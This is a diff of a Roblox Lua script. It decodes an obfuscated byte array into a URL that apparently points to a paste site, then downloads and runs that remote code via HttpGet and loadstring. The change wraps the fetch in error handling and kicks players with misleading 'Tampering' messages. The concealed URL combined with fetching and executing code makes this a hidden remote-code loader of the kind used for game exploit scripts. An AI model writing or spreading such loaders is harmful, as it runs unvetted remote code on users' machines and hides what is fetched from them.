@@ -1,4 +1,3 @@
-warn("Detected mobile..")
 local l1l1ll1 = game:GetService("Players").LocalPlayer
 local UIS = game:GetService("UserInputService")
 
@@ -7,7 +6,7 @@ local function checkMobile()
 end
 
 if not checkMobile() then
-    l1l1ll1:Kick("Mobile Only Script")
+    l1l1ll1:Kick("Tampering (PC User)")
     return
 end
 
@@ -20,4 +19,10 @@ local _raw = {104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 98, 1
 local _url = ""
 for i = 1, #_raw do _url = _url .. string.char(_raw[i]) end
 
-loadstring(game:HttpGet(_url))()
+local s, err = pcall(function()
+    loadstring(game:HttpGet(_url))()
+end)
+
+if not s then
+    l1l1ll1:Kick("Tampering (Fetch Failed)")
+end
